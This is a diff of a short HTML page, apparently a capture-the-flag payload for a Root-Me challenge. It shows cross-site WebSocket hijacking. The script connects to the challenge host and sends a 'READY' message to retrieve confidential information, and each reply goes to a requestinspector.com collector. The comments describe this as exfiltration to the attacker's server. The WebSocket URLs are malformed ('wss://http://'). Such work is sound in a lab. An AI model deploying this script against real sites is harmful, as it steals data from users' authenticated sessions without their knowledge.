@@ -3,22 +3,17 @@
 <head>
   <title>Code d'exécution automatique</title>
   <script>
-    websocket = new WebSocket('ws://http://ctf28.root-me.org');
-    websocket.onopen = start;
-    websocket.onmessage = handleReply;
-  
+    websocket = new WebSocket('wss://http://ctf28.root-me.org/room')
+    websocket.onopen = start
+    websocket.onmessage = handleReply
     function start(event) {
-      websocket.send("attackers-message");
+    websocket.send("READY"); //Send the message to retrieve confidential information
     }
-  
     function handleReply(event) {
-      fetch('https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: event.data
-      });
+    //Exfiltrate the confidential information to attackers server
+    fetch('https://requestinspector.com/inspect/01gyaf1q2zrdrde530pd9ma6pr/?'+event.data, {mode: 'no-cors'})
     }
-  </script>
+  </script> 
 </head>
 <body>
   <h1>Code d'exécution automatique</h1>
